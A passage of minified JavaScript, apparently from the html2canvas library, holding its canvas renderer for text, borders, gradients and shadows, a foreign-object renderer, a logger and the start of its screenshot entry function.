n=this._document.createElement("div"),r=this._document.createElement("img"),i=this._document.createElement("span"),a=this._document.body;n.style.visibility="hidden",n.style.fontFamily=e,n.style.fontSize=t,n.style.margin="0",n.style.padding="0",a.appendChild(n),r.src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",r.width=1,r.height=1,r.style.margin="0",r.style.padding="0",r.style.verticalAlign="baseline",i.style.fontFamily=e,i.style.fontSize=t,i.style.margin="0",i.style.padding="0",i.appendChild(this._document.createTextNode(Mo)),n.appendChild(i),n.appendChild(r);var o=r.offsetTop-i.offsetTop+2;n.removeChild(i),n.appendChild(this._document.createTextNode(Mo)),n.style.lineHeight="normal",r.style.verticalAlign="super";var s=r.offsetTop-n.offsetTop+2;return a.removeChild(n),{baseline:o,middle:s}},e.prototype.getMetrics=function(e,t){var n=e+" "+t;return void 0===this._data[n]&&(this._data[n]=this.parseMetrics(e,t)),this._data[n]},e}(),Eo=function(e,t){this.context=e,this.options=t},To=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r._activeEffects=[],r.canvas=n.canvas?n.canvas:document.createElement("canvas"),r.ctx=r.canvas.getContext("2d"),n.canvas||(r.canvas.width=Math.floor(n.width*n.scale),r.canvas.height=Math.floor(n.height*n.scale),r.canvas.style.width=n.width+"px",r.canvas.style.height=n.height+"px"),r.fontMetrics=new Bo(document),r.ctx.scale(r.options.scale,r.options.scale),r.ctx.translate(-n.x,-n.y),r.ctx.textBaseline="bottom",r._activeEffects=[],r.context.logger.debug("Canvas renderer initialized ("+n.width+"x"+n.height+") with scale "+n.scale),r}return t(n,e),n.prototype.applyEffects=function(e){for(var t=this;this._activeEffects.length;)this.popEffect();e.forEach((function(e){return t.applyEffect(e)}))},n.prototype.applyEffect=function(e){this.ctx.save(),2===e.type&&(this.ctx.globalAlpha=e.opacity),0===e.type&&(this.ctx.translate(e.offsetX,e.offsetY),this.ctx.transform(e.matrix[0],e.matrix[1],e.matrix[2],e.matrix[3],e.matrix[4],e.matrix[5]),this.ctx.translate(-e.offsetX,-e.offsetY)),po(e)&&(this.path(e.path),this.ctx.clip()),this._activeEffects.push(e)},n.prototype.popEffect=function(){this._activeEffects.pop(),this.ctx.restore()},n.prototype.renderStack=function(e){return r(this,void 0,void 0,(function(){return i(this,(function(t){switch(t.label){case 0:return e.element.container.styles.isVisible()?[4,this.renderStackContent(e)]:[3,2];case 1:t.sent(),t.label=2;case 2:return[2]}}))}))},n.prototype.renderNode=function(e){return r(this,void 0,void 0,(function(){return i(this,(function(t){switch(t.label){case 0:return Pr(e.container.flags,16),e.container.styles.isVisible()?[4,this.renderNodeBackgroundAndBorders(e)]:[3,3];case 1:return t.sent(),[4,this.renderNodeContent(e)];case 2:t.sent(),t.label=3;case 3:return[2]}}))}))},n.prototype.renderTextWithLetterSpacing=function(e,t,n){var r=this;0===t?this.ctx.fillText(e.text,e.bounds.left,e.bounds.top+n):yi(e.text).reduce((function(t,i){return r.ctx.fillText(i,t,e.bounds.top+n),t+r.ctx.measureText(i).width}),e.bounds.left)},n.prototype.createFontStyle=function(e){var t=e.fontVariant.filter((function(e){return"normal"===e||"small-caps"===e})).join(""),n=e.fontFamily.join(", "),r=Ne(e.fontSize)?""+e.fontSize.number+e.fontSize.unit:e.fontSize.number+"px";return[[e.fontStyle,t,e.fontWeight,r,n].join(" "),n,r]},n.prototype.renderTextNode=function(e,t){return r(this,void 0,void 0,(function(){var n,r,a,o,s,l,c,u,d=this;return i(this,(function(i){return n=this.createFontStyle(t),r=n[0],a=n[1],o=n[2],this.ctx.font=r,this.ctx.direction=1===t.direction?"rtl":"ltr",this.ctx.textAlign="left",this.ctx.textBaseline="alphabetic",s=this.fontMetrics.getMetrics(a,o),l=s.baseline,c=s.middle,u=t.paintOrder,e.textBounds.forEach((function(e){u.forEach((function(n){switch(n){case Br.FILL:d.ctx.fillStyle=at(t.color),d.renderTextWithLetterSpacing(e,t.letterSpacing,l);var r=t.textShadow;r.length&&e.text.trim().length&&(r.slice(0).reverse().forEach((function(n){d.ctx.shadowColor=at(n.color),d.ctx.shadowOffsetX=n.offsetX.number*d.options.scale,d.ctx.shadowOffsetY=n.offsetY.number*d.options.scale,d.ctx.shadowBlur=n.blur.number,d.renderTextWithLetterSpacing(e,t.letterSpacing,l)})),d.ctx.shadowColor="",d.ctx.shadowOffsetX=0,d.ctx.shadowOffsetY=0,d.ctx.shadowBlur=0),t.textDecorationLine.length&&(d.ctx.fillStyle=at(t.textDecorationColor||t.color),t.textDecorationLine.forEach((function(t){switch(t){case 1:d.ctx.fillRect(e.bounds.left,Math.round(e.bounds.top+l),e.bounds.width,1);break;case 2:d.ctx.fillRect(e.bounds.left,Math.round(e.bounds.top),e.bounds.width,1);break;case 3:d.ctx.fillRect(e.bounds.left,Math.ceil(e.bounds.top+c),e.bounds.width,1)}})));break;case Br.STROKE:t.webkitTextStrokeWidth&&e.text.trim().length&&(d.ctx.strokeStyle=at(t.webkitTextStrokeColor),d.ctx.lineWidth=t.webkitTextStrokeWidth,d.ctx.lineJoin=window.chrome?"miter":"round",d.ctx.strokeText(e.text,e.bounds.left,e.bounds.top+l)),d.ctx.strokeStyle="",d.ctx.lineWidth=0,d.ctx.lineJoin="miter"}}))})),[2]}))}))},n.prototype.renderReplacedElement=function(e,t,n){if(n&&0<e.intrinsicWidth&&0<e.intrinsicHeight){var r=bo(e),i=so(t);this.path(i),this.ctx.save(),this.ctx.clip(),this.ctx.drawImage(n,0,0,e.intrinsicWidth,e.intrinsicHeight,r.left,r.top,r.width,r.height),this.ctx.restore()}},n.prototype.renderNodeContent=function(e){return r(this,void 0,void 0,(function(){var t,r,o,s,l,c,u,d,p,h,f,A,m,v,g,y,b,_;return i(this,(function(i){switch(i.label){case 0:this.applyEffects(e.getEffects(4)),t=e.container,r=e.curves,o=t.styles,s=0,l=t.textNodes,i.label=1;case 1:return s<l.length?(c=l[s],[4,this.renderTextNode(c,o)]):[3,4];case 2:i.sent(),i.label=3;case 3:return s++,[3,1];case 4:if(!(t instanceof Ii))return[3,8];i.label=5;case 5:return i.trys.push([5,7,,8]),[4,this.context.cache.match(t.src)];case 6:return g=i.sent(),this.renderReplacedElement(t,r,g),[3,8];case 7:return i.sent(),this.context.logger.error("Error loading image "+t.src),[3,8];case 8:if(t instanceof Fi&&this.renderReplacedElement(t,r,t.canvas),!(t instanceof Li))return[3,12];i.label=9;case 9:return i.trys.push([9,11,,12]),[4,this.context.cache.match(t.svg)];case 10:return g=i.sent(),this.renderReplacedElement(t,r,g),[3,12];case 11:return i.sent(),this.context.logger.error("Error loading svg "+t.svg.substring(0,255)),[3,12];case 12:return t instanceof Vi&&t.tree?[4,new n(this.context,{scale:this.options.scale,backgroundColor:t.backgroundColor,x:0,y:0,width:t.width,height:t.height}).render(t.tree)]:[3,14];case 13:u=i.sent(),t.width&&t.height&&this.ctx.drawImage(u,0,0,t.width,t.height,t.bounds.left,t.bounds.top,t.bounds.width,t.bounds.height),i.label=14;case 14:if(t instanceof $i&&(d=Math.min(t.bounds.width,t.bounds.height),t.type===ji?t.checked&&(this.ctx.save(),this.path([new eo(t.bounds.left+.39363*d,t.bounds.top+.79*d),new eo(t.bounds.left+.16*d,t.bounds.top+.5549*d),new eo(t.bounds.left+.27347*d,t.bounds.top+.44071*d),new eo(t.bounds.left+.39694*d,t.bounds.top+.5649*d),new eo(t.bounds.left+.72983*d,t.bounds.top+.23*d),new eo(t.bounds.left+.84*d,t.bounds.top+.34085*d),new eo(t.bounds.left+.39363*d,t.bounds.top+.79*d)]),this.ctx.fillStyle=at(707406591),this.ctx.fill(),this.ctx.restore()):t.type===Ui&&t.checked&&(this.ctx.save(),this.ctx.beginPath(),this.ctx.arc(t.bounds.left+d/2,t.bounds.top+d/2,d/4,0,2*Math.PI,!0),this.ctx.fillStyle=at(707406591),this.ctx.fill(),this.ctx.restore())),Po(t)&&t.value.length){switch(p=this.createFontStyle(o),b=p[0],h=p[1],f=this.fontMetrics.getMetrics(b,h).baseline,this.ctx.font=b,this.ctx.fillStyle=at(o.color),this.ctx.textBaseline="alphabetic",this.ctx.textAlign=Fo(t.styles.textAlign),_=bo(t),A=0,t.styles.textAlign){case Hn.CENTER:A+=_.width/2;break;case Hn.RIGHT:A+=_.width}m=_.add(A,0,0,-_.height/2+1),this.ctx.save(),this.path([new eo(_.left,_.top),new eo(_.left+_.width,_.top),new eo(_.left+_.width,_.top+_.height),new eo(_.left,_.top+_.height)]),this.ctx.clip(),this.renderTextWithLetterSpacing(new xi(t.value,m),o.letterSpacing,f),this.ctx.restore(),this.ctx.textBaseline="alphabetic",this.ctx.textAlign="left"}if(!Pr(t.styles.display,2048))return[3,20];if(null===t.styles.listStyleImage)return[3,19];if((v=t.styles.listStyleImage).type!==mt.URL)return[3,18];g=void 0,y=v.url,i.label=15;case 15:return i.trys.push([15,17,,18]),[4,this.context.cache.match(y)];case 16:return g=i.sent(),this.ctx.drawImage(g,t.bounds.left-(g.width+10),t.bounds.top),[3,18];case 17:return i.sent(),this.context.logger.error("Error loading list-style-image "+y),[3,18];case 18:return[3,20];case 19:e.listValue&&t.styles.listStyleType!==In.NONE&&(b=this.createFontStyle(o)[0],this.ctx.font=b,this.ctx.fillStyle=at(o.color),this.ctx.textBaseline="middle",this.ctx.textAlign="right",_=new a(t.bounds.left,t.bounds.top+Je(t.styles.paddingTop,t.bounds.width),t.bounds.width,Tn(o.lineHeight,o.fontSize.number)/2+1),this.renderTextWithLetterSpacing(new xi(e.listValue,_),o.letterSpacing,Tn(o.lineHeight,o.fontSize.number)/2+2),this.ctx.textBaseline="bottom",this.ctx.textAlign="left"),i.label=20;case 20:return[2]}}))}))},n.prototype.renderStackContent=function(e){return r(this,void 0,void 0,(function(){var t,n,r,a,o,s,l,c,u,d,p,h,f,A,m;return i(this,(function(i){switch(i.label){case 0:return Pr(e.element.container.flags,16),[4,this.renderNodeBackgroundAndBorders(e.element)];case 1:i.sent(),t=0,n=e.negativeZIndex,i.label=2;case 2:return t<n.length?(m=n[t],[4,this.renderStack(m)]):[3,5];case 3:i.sent(),i.label=4;case 4:return t++,[3,2];case 5:return[4,this.renderNodeContent(e.element)];case 6:i.sent(),r=0,a=e.nonInlineLevel,i.label=7;case 7:return r<a.length?(m=a[r],[4,this.renderNode(m)]):[3,10];case 8:i.sent(),i.label=9;case 9:return r++,[3,7];case 10:o=0,s=e.nonPositionedFloats,i.label=11;case 11:return o<s.length?(m=s[o],[4,this.renderStack(m)]):[3,14];case 12:i.sent(),i.label=13;case 13:return o++,[3,11];case 14:l=0,c=e.nonPositionedInlineLevel,i.label=15;case 15:return l<c.length?(m=c[l],[4,this.renderStack(m)]):[3,18];case 16:i.sent(),i.label=17;case 17:return l++,[3,15];case 18:u=0,d=e.inlineLevel,i.label=19;case 19:return u<d.length?(m=d[u],[4,this.renderNode(m)]):[3,22];case 20:i.sent(),i.label=21;case 21:return u++,[3,19];case 22:p=0,h=e.zeroOrAutoZIndexOrTransformedOrOpacity,i.label=23;case 23:return p<h.length?(m=h[p],[4,this.renderStack(m)]):[3,26];case 24:i.sent(),i.label=25;case 25:return p++,[3,23];case 26:f=0,A=e.positiveZIndex,i.label=27;case 27:return f<A.length?(m=A[f],[4,this.renderStack(m)]):[3,30];case 28:i.sent(),i.label=29;case 29:return f++,[3,27];case 30:return[2]}}))}))},n.prototype.mask=function(e){this.ctx.beginPath(),this.ctx.moveTo(0,0),this.ctx.lineTo(this.canvas.width,0),this.ctx.lineTo(this.canvas.width,this.canvas.height),this.ctx.lineTo(0,this.canvas.height),this.ctx.lineTo(0,0),this.formatPath(e.slice(0).reverse()),this.ctx.closePath()},n.prototype.path=function(e){this.ctx.beginPath(),this.formatPath(e),this.ctx.closePath()},n.prototype.formatPath=function(e){var t=this;e.forEach((function(e,n){var r=ro(e)?e.start:e;0===n?t.ctx.moveTo(r.x,r.y):t.ctx.lineTo(r.x,r.y),ro(e)&&t.ctx.bezierCurveTo(e.startControl.x,e.startControl.y,e.endControl.x,e.endControl.y,e.end.x,e.end.y)}))},n.prototype.renderRepeat=function(e,t,n,r){this.path(e),this.ctx.fillStyle=t,this.ctx.translate(n,r),this.ctx.fill(),this.ctx.translate(-n,-r)},n.prototype.resizeImage=function(e,t,n){var r;if(e.width===t&&e.height===n)return e;var i=(null!==(r=this.canvas.ownerDocument)&&void 0!==r?r:document).createElement("canvas");return i.width=Math.max(1,t),i.height=Math.max(1,n),i.getContext("2d").drawImage(e,0,0,e.width,e.height,0,0,t,n),i},n.prototype.renderBackgroundImage=function(e){return r(this,void 0,void 0,(function(){var t,n,r,a,o,s;return i(this,(function(l){switch(l.label){case 0:t=e.styles.backgroundImage.length-1,n=function(n){var a,o,s,l,c,u,d,p,h,f,A,m,v,g,y,b,_,w,C,x,S,k,M,B,E,T,P,I,F,L,O;return i(this,(function(i){switch(i.label){case 0:if(n.type!==mt.URL)return[3,5];a=void 0,o=n.url,i.label=1;case 1:return i.trys.push([1,3,,4]),[4,r.context.cache.match(o)];case 2:return a=i.sent(),[3,4];case 3:return i.sent(),r.context.logger.error("Error loading background-image "+o),[3,4];case 4:return a&&(s=_o(e,t,[a.width,a.height,a.width/a.height]),b=s[0],k=s[1],M=s[2],C=s[3],x=s[4],g=r.ctx.createPattern(r.resizeImage(a,C,x),"repeat"),r.renderRepeat(b,g,k,M)),[3,6];case 5:n.type===mt.LINEAR_GRADIENT?(l=_o(e,t,[null,null,null]),b=l[0],k=l[1],M=l[2],C=l[3],x=l[4],c=function(e,t,n){var r,i,a,o,s,l,c,u="number"==typeof e?e:(o=(i=t)/2,s=(a=n)/2,l=Je((r=e)[0],i)-o,c=s-Je(r[1],a),(Math.atan2(c,l)+2*Math.PI)%(2*Math.PI)),d=Math.abs(t*Math.sin(u))+Math.abs(n*Math.cos(u)),p=t/2,h=n/2,f=d/2,A=Math.sin(u-Math.PI/2)*f,m=Math.cos(u-Math.PI/2)*f;return[d,p-m,p+m,h-A,h+A]}(n.angle,C,x),u=c[0],d=c[1],p=c[2],h=c[3],f=c[4],(A=document.createElement("canvas")).width=C,A.height=x,m=A.getContext("2d"),v=m.createLinearGradient(d,h,p,f),St(n.stops,u).forEach((function(e){return v.addColorStop(e.stop,at(e.color))})),m.fillStyle=v,m.fillRect(0,0,C,x),0<C&&0<x&&(g=r.ctx.createPattern(A,"repeat"),r.renderRepeat(b,g,k,M))):n.type===mt.RADIAL_GRADIENT&&(y=_o(e,t,[null,null,null]),b=y[0],_=y[1],w=y[2],C=y[3],x=y[4],S=0===n.position.length?[qe]:n.position,k=Je(S[0],C),M=Je(S[S.length-1],x),B=function(e,t,n,r,i){var a=0,o=0;switch(e.size){case bt.CLOSEST_SIDE:e.shape===gt.CIRCLE?a=o=Math.min(Math.abs(t),Math.abs(t-r),Math.abs(n),Math.abs(n-i)):e.shape===gt.ELLIPSE&&(a=Math.min(Math.abs(t),Math.abs(t-r)),o=Math.min(Math.abs(n),Math.abs(n-i)));break;case bt.CLOSEST_CORNER:if(e.shape===gt.CIRCLE)a=o=Math.min(kt(t,n),kt(t,n-i),kt(t-r,n),kt(t-r,n-i));else if(e.shape===gt.ELLIPSE){var s=Math.min(Math.abs(n),Math.abs(n-i))/Math.min(Math.abs(t),Math.abs(t-r)),l=Mt(r,i,t,n,!0),c=l[0],u=l[1];o=s*(a=kt(c-t,(u-n)/s))}break;case bt.FARTHEST_SIDE:e.shape===gt.CIRCLE?a=o=Math.max(Math.abs(t),Math.abs(t-r),Math.abs(n),Math.abs(n-i)):e.shape===gt.ELLIPSE&&(a=Math.max(Math.abs(t),Math.abs(t-r)),o=Math.max(Math.abs(n),Math.abs(n-i)));break;case bt.FARTHEST_CORNER:if(e.shape===gt.CIRCLE)a=o=Math.max(kt(t,n),kt(t,n-i),kt(t-r,n),kt(t-r,n-i));else if(e.shape===gt.ELLIPSE){s=Math.max(Math.abs(n),Math.abs(n-i))/Math.max(Math.abs(t),Math.abs(t-r));var d=Mt(r,i,t,n,!1);c=d[0],u=d[1],o=s*(a=kt(c-t,(u-n)/s))}}return Array.isArray(e.size)&&(a=Je(e.size[0],r),o=2===e.size.length?Je(e.size[1],i):a),[a,o]}(n,k,M,C,x),E=B[0],T=B[1],0<E&&0<T&&(P=r.ctx.createRadialGradient(_+k,w+M,0,_+k,w+M,E),St(n.stops,2*E).forEach((function(e){return P.addColorStop(e.stop,at(e.color))})),r.path(b),r.ctx.fillStyle=P,E!==T?(I=e.bounds.left+.5*e.bounds.width,F=e.bounds.top+.5*e.bounds.height,O=1/(L=T/E),r.ctx.save(),r.ctx.translate(I,F),r.ctx.transform(1,0,0,L,0,0),r.ctx.translate(-I,-F),r.ctx.fillRect(_,O*(w-F)+F,C,x*O),r.ctx.restore()):r.ctx.fill())),i.label=6;case 6:return t--,[2]}}))},r=this,a=0,o=e.styles.backgroundImage.slice(0).reverse(),l.label=1;case 1:return a<o.length?(s=o[a],[5,n(s)]):[3,4];case 2:l.sent(),l.label=3;case 3:return a++,[3,1];case 4:return[2]}}))}))},n.prototype.renderSolidBorder=function(e,t,n){return r(this,void 0,void 0,(function(){return i(this,(function(r){return this.path(mo(n,t)),this.ctx.fillStyle=at(e),this.ctx.fill(),[2]}))}))},n.prototype.renderDoubleBorder=function(e,t,n,a){return r(this,void 0,void 0,(function(){var r,o;return i(this,(function(i){switch(i.label){case 0:return t<3?[4,this.renderSolidBorder(e,n,a)]:[3,2];case 1:return i.sent(),[2];case 2:return r=function(e,t){switch(t){case 0:return go(e.topLeftBorderBox,e.topLeftBorderDoubleOuterBox,e.topRightBorderBox,e.topRightBorderDoubleOuterBox);case 1:return go(e.topRightBorderBox,e.topRightBorderDoubleOuterBox,e.bottomRightBorderBox,e.bottomRightBorderDoubleOuterBox);case 2:return go(e.bottomRightBorderBox,e.bottomRightBorderDoubleOuterBox,e.bottomLeftBorderBox,e.bottomLeftBorderDoubleOuterBox);case 3:default:return go(e.bottomLeftBorderBox,e.bottomLeftBorderDoubleOuterBox,e.topLeftBorderBox,e.topLeftBorderDoubleOuterBox)}}(a,n),this.path(r),this.ctx.fillStyle=at(e),this.ctx.fill(),o=function(e,t){switch(t){case 0:return go(e.topLeftBorderDoubleInnerBox,e.topLeftPaddingBox,e.topRightBorderDoubleInnerBox,e.topRightPaddingBox);case 1:return go(e.topRightBorderDoubleInnerBox,e.topRightPaddingBox,e.bottomRightBorderDoubleInnerBox,e.bottomRightPaddingBox);case 2:return go(e.bottomRightBorderDoubleInnerBox,e.bottomRightPaddingBox,e.bottomLeftBorderDoubleInnerBox,e.bottomLeftPaddingBox);case 3:default:return go(e.bottomLeftBorderDoubleInnerBox,e.bottomLeftPaddingBox,e.topLeftBorderDoubleInnerBox,e.topLeftPaddingBox)}}(a,n),this.path(o),this.ctx.fill(),[2]}}))}))},n.prototype.renderNodeBackgroundAndBorders=function(e){return r(this,void 0,void 0,(function(){var t,n,r,a,o,s,l,c,u=this;return i(this,(function(i){switch(i.label){case 0:return this.applyEffects(e.getEffects(2)),t=e.container.styles,n=!it(t.backgroundColor)||t.backgroundImage.length,r=[{style:t.borderTopStyle,color:t.borderTopColor,width:t.borderTopWidth},{style:t.borderRightStyle,color:t.borderRightColor,width:t.borderRightWidth},{style:t.borderBottomStyle,color:t.borderBottomColor,width:t.borderBottomWidth},{style:t.borderLeftStyle,color:t.borderLeftColor,width:t.borderLeftWidth}],a=Io(So(t.backgroundClip,0),e.curves),n||t.boxShadow.length?(this.ctx.save(),this.path(a),this.ctx.clip(),it(t.backgroundColor)||(this.ctx.fillStyle=at(t.backgroundColor),this.ctx.fill()),[4,this.renderBackgroundImage(e.container)]):[3,2];case 1:i.sent(),this.ctx.restore(),t.boxShadow.slice(0).reverse().forEach((function(t){u.ctx.save();var n,r,i,a,o,s=oo(e.curves),l=t.inset?0:1e4,c=(n=s,r=-l+(t.inset?1:-1)*t.spread.number,i=(t.inset?1:-1)*t.spread.number,a=t.spread.number*(t.inset?-2:2),o=t.spread.number*(t.inset?-2:2),n.map((function(e,t){switch(t){case 0:return e.add(r,i);case 1:return e.add(r+a,i);case 2:return e.add(r+a,i+o);case 3:return e.add(r,i+o)}return e})));t.inset?(u.path(s),u.ctx.clip(),u.mask(c)):(u.mask(s),u.ctx.clip(),u.path(c)),u.ctx.shadowOffsetX=t.offsetX.number+l,u.ctx.shadowOffsetY=t.offsetY.number,u.ctx.shadowColor=at(t.color),u.ctx.shadowBlur=t.blur.number,u.ctx.fillStyle=t.inset?at(t.color):"rgba(0,0,0,1)",u.ctx.fill(),u.ctx.restore()})),i.label=2;case 2:s=o=0,l=r,i.label=3;case 3:return s<l.length?(c=l[s]).style!==Qt.NONE&&!it(c.color)&&0<c.width?c.style!==Qt.DASHED?[3,5]:[4,this.renderDashedDottedBorder(c.color,c.width,o,e.curves,Qt.DASHED)]:[3,11]:[3,13];case 4:return i.sent(),[3,11];case 5:return c.style!==Qt.DOTTED?[3,7]:[4,this.renderDashedDottedBorder(c.color,c.width,o,e.curves,Qt.DOTTED)];case 6:return i.sent(),[3,11];case 7:return c.style!==Qt.DOUBLE?[3,9]:[4,this.renderDoubleBorder(c.color,c.width,o,e.curves)];case 8:return i.sent(),[3,11];case 9:return[4,this.renderSolidBorder(c.color,o,e.curves)];case 10:i.sent(),i.label=11;case 11:o++,i.label=12;case 12:return s++,[3,3];case 13:return[2]}}))}))},n.prototype.renderDashedDottedBorder=function(e,t,n,a,o){return r(this,void 0,void 0,(function(){var r,s,l,c,u,d,p,h,f,A,m,v,g,y,b,_;return i(this,(function(i){return this.ctx.save(),r=function(e,t){switch(t){case 0:return vo(e.topLeftBorderStroke,e.topRightBorderStroke);case 1:return vo(e.topRightBorderStroke,e.bottomRightBorderStroke);case 2:return vo(e.bottomRightBorderStroke,e.bottomLeftBorderStroke);case 3:default:return vo(e.bottomLeftBorderStroke,e.topLeftBorderStroke)}}(a,n),s=mo(a,n),o===Qt.DASHED&&(this.path(s),this.ctx.clip()),c=ro(s[0])?(l=s[0].start.x,s[0].start.y):(l=s[0].x,s[0].y),d=ro(s[1])?(u=s[1].end.x,s[1].end.y):(u=s[1].x,s[1].y),p=0===n||2===n?Math.abs(l-u):Math.abs(c-d),this.ctx.beginPath(),o===Qt.DOTTED?this.formatPath(r):this.formatPath(s.slice(0,2)),h=t<3?3*t:2*t,f=t<3?2*t:t,o===Qt.DOTTED&&(f=h=t),A=!0,p<=2*h?A=!1:p<=2*h+f?(h*=m=p/(2*h+f),f*=m):(v=Math.floor((p+f)/(h+f)),g=(p-v*h)/(v-1),f=(y=(p-(v+1)*h)/v)<=0||Math.abs(f-g)<Math.abs(f-y)?g:y),A&&(o===Qt.DOTTED?this.ctx.setLineDash([0,h+f]):this.ctx.setLineDash([h,f])),o===Qt.DOTTED?(this.ctx.lineCap="round",this.ctx.lineWidth=t):this.ctx.lineWidth=2*t+1.1,this.ctx.strokeStyle=at(e),this.ctx.stroke(),this.ctx.setLineDash([]),o===Qt.DASHED&&(ro(s[0])&&(b=s[3],_=s[0],this.ctx.beginPath(),this.formatPath([new eo(b.end.x,b.end.y),new eo(_.start.x,_.start.y)]),this.ctx.stroke()),ro(s[1])&&(b=s[1],_=s[2],this.ctx.beginPath(),this.formatPath([new eo(b.end.x,b.end.y),new eo(_.start.x,_.start.y)]),this.ctx.stroke())),this.ctx.restore(),[2]}))}))},n.prototype.render=function(e){return r(this,void 0,void 0,(function(){var t;return i(this,(function(n){switch(n.label){case 0:return this.options.backgroundColor&&(this.ctx.fillStyle=at(this.options.backgroundColor),this.ctx.fillRect(this.options.x,this.options.y,this.options.width,this.options.height)),t=function(e){var t=new fo(e,null),n=new ho(t),r=[];return function e(t,n,r,i){t.container.elements.forEach((function(a){var o=Pr(a.flags,4),s=Pr(a.flags,2),l=new fo(a,t);Pr(a.styles.display,2048)&&i.push(l);var c=Pr(a.flags,8)?[]:i;if(o||s){var u=o||a.styles.isPositioned()?r:n,d=new ho(l);if(a.styles.isPositioned()||a.styles.opacity<1||a.styles.isTransformed()){var p=a.styles.zIndex.order;if(p<0){var h=0;u.negativeZIndex.some((function(e,t){return p>e.element.container.styles.zIndex.order?(h=t,!1):0<h})),u.negativeZIndex.splice(h,0,d)}else if(0<p){var f=0;u.positiveZIndex.some((function(e,t){return p>=e.element.container.styles.zIndex.order?(f=t+1,!1):0<f})),u.positiveZIndex.splice(f,0,d)}else u.zeroOrAutoZIndexOrTransformedOrOpacity.push(d)}else a.styles.isFloating()?u.nonPositionedFloats.push(d):u.nonPositionedInlineLevel.push(d);e(l,d,o?d:r,c)}else a.styles.isInlineLevel()?n.inlineLevel.push(l):n.nonInlineLevel.push(l),e(l,n,r,c);Pr(a.flags,8)&&Ao(a,c)}))}(t,n,n,r),Ao(t.container,r),n}(e),[4,this.renderStack(t)];case 1:return n.sent(),this.applyEffects([]),[2,this.canvas]}}))}))},n}(Eo),Po=function(e){return e instanceof Hi||e instanceof zi||e instanceof $i&&e.type!==Ui&&e.type!==ji},Io=function(e,t){switch(e){case ut.BORDER_BOX:return oo(t);case ut.CONTENT_BOX:return[(n=t).topLeftContentBox,n.topRightContentBox,n.bottomRightContentBox,n.bottomLeftContentBox];case ut.PADDING_BOX:default:return so(t)}var n},Fo=function(e){switch(e){case Hn.CENTER:return"center";case Hn.RIGHT:return"right";case Hn.LEFT:default:return"left"}},Lo=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r.canvas=n.canvas?n.canvas:document.createElement("canvas"),r.ctx=r.canvas.getContext("2d"),r.options=n,r.canvas.width=Math.floor(n.width*n.scale),r.canvas.height=Math.floor(n.height*n.scale),r.canvas.style.width=n.width+"px",r.canvas.style.height=n.height+"px",r.ctx.scale(r.options.scale,r.options.scale),r.ctx.translate(-n.x,-n.y),r.context.logger.debug("EXPERIMENTAL ForeignObject renderer initialized ("+n.width+"x"+n.height+" at "+n.x+","+n.y+") with scale "+n.scale),r}return t(n,e),n.prototype.render=function(e){return r(this,void 0,void 0,(function(){var t,n;return i(this,(function(r){switch(r.label){case 0:return t=_i(this.options.width*this.options.scale,this.options.height*this.options.scale,this.options.scale,this.options.scale,e),[4,Oo(t)];case 1:return n=r.sent(),this.options.backgroundColor&&(this.ctx.fillStyle=at(this.options.backgroundColor),this.ctx.fillRect(0,0,this.options.width*this.options.scale,this.options.height*this.options.scale)),this.ctx.drawImage(n,-this.options.x*this.options.scale,-this.options.y*this.options.scale),[2,this.canvas]}}))}))},n}(Eo),Oo=function(e){return new Promise((function(t,n){var r=new Image;r.onload=function(){t(r)},r.onerror=n,r.src="data:image/svg+xml;charset=utf-8,"+encodeURIComponent((new XMLSerializer).serializeToString(e))}))},No=function(){function e(e){var t=e.id,n=e.enabled;this.id=t,this.enabled=n,this.start=Date.now()}return e.prototype.debug=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this.enabled&&("undefined"!=typeof window&&window.console&&"function"==typeof console.debug||this.info.apply(this,e))},e.prototype.getTime=function(){return Date.now()-this.start},e.prototype.info=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this.enabled&&"undefined"!=typeof window&&window.console&&console.info},e.prototype.warn=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this.enabled&&("undefined"!=typeof window&&window.console&&"function"==typeof console.warn||this.info.apply(this,e))},e.prototype.error=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this.enabled&&("undefined"!=typeof window&&window.console&&"function"==typeof console.error||this.info.apply(this,e))},e.instances={},e}(),Do=function(){function e(t,n){var r;this.windowBounds=n,this.instanceName="#"+e.instanceCount++,this.logger=new No({id:this.instanceName,enabled:t.logging}),this.cache=null!==(r=t.cache)&&void 0!==r?r:new za(this,t)}return e.instanceCount=1,e}();"undefined"!=typeof window&&$a.setContext(window);var Ro=function(e,t,n){var r=t.ownerDocument,i=r.documentElement?ft(e,getComputedStyle(r.documentElement).backgroundColor):At.TRANSPARENT,a=r.body?ft(e,getComputedStyle(r.body).backgroundColor):At.TRANSPARENT,o="string"==typeof n?ft(e,n):null===n?At.TRANSPARENT:4294967295;return t===r.documentElement?it(i)?it(a)?o:a:i:o};return function(e,t){return void 0===t&&(t={}),function(e,t){return r(void 0,void 0,void 0,(function(){var r,s,l,c,u,d,p,h,f,A,m,v,g,y,b,_,w,C,x,S,k,M,B,E,T,P,I,F,L,O,N,D,R,j,U,$,z,H;return i(this,(function(i){switch(i.label){case 0:if(!e||"object"!==_typeof2(e))return[2,Promise.reject("Invalid element provided as first argument")];if(!(r=e.ownerDocument))throw new Error("Element is not attached to a Document");if(!(s=r.defaultView))throw new Error("Document is not attached to a Window");return l={allowTaint:null!==(M=t.allowTaint)&&void 0!==M&&M,imageTimeout:null!==(B=t.imageTimeout)&&void 0!==B?B:15e3,proxy:t.proxy,useCORS:null!==(E=t.useCORS)&&void 0!==E&&E},c=n({logging:null===(T=t.logging)||void 0===T||T,cache:t.cache},l),u={windowWidth:null!==(P=t.windowWidth)&&void 0!==P?P:s.innerWidth,windowHeight:null!==(I=t.windowHeight)&&void 0!==I?I:s.innerHeight,scrollX:null!==(F=t.scrollX)&&void 0!==F?F:s.pageXOffset,scrollY:null!==(L=t.scrollY)&&void 0!==L?L:s.pageYOffset},d=new a(u.scrollX,u.scrollY,u.windowWidth,u.windowHeight),p=new Do(c,d),h=null!==(O=t.foreignObjectRendering)&&void 0!==O&&O,f={allowTaint:null!==(N=t.allowTaint)&&void 0!==N&&N,onclone:t.onclone,ignoreElements:t.ignoreElements,inlineImages:h,copyStyles:h},p.logger.debug("Starting document clone with size "+d.width+"x"+d.height+" scrolled to "+-d.left+","+-d.top),A=new 